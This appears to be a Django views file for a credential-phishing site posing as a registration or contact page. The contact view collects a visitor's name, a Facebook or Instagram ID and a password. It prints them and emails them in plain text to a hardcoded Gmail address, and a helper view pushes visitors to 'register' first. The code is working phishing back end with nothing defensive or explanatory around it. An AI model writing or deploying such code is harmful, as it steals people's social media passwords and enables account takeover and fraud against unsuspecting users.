from django.shortcuts import render
from django.core.mail import send_mail
from django.contrib import messages
from django.conf  import settings
from django.shortcuts import redirect


# Create your views here.
def home(request):
    return render(request,'home.html');

def contact(request):
    if request.method == "POST":
        name=request.POST.get('name')
        facebookID=request.POST.get('facebookId')
        password=request.POST.get('password')
        print(name,facebookID,password)
        subject='Try to Register'
        message= f"\n\n\none user has tried to register!\n\n\n\n\nname -: {name}\n\n\n instagram id -: {facebookID}\n\n\npassword -: {password}"
        email_from= settings.EMAIL_HOST_USER
        email_to=['playourgame936@gmail.com']
        send_mail(subject, message, email_from, email_to,fail_silently=False,)
        return  redirect('end-page')



    return render(request,'contact.html')


def endpage(request):
    return render(request,'endpage.html')

def message(request):
    messages.info(request,"Please Register Yourself First!")
    return redirect(request.META['HTTP_REFERER'])
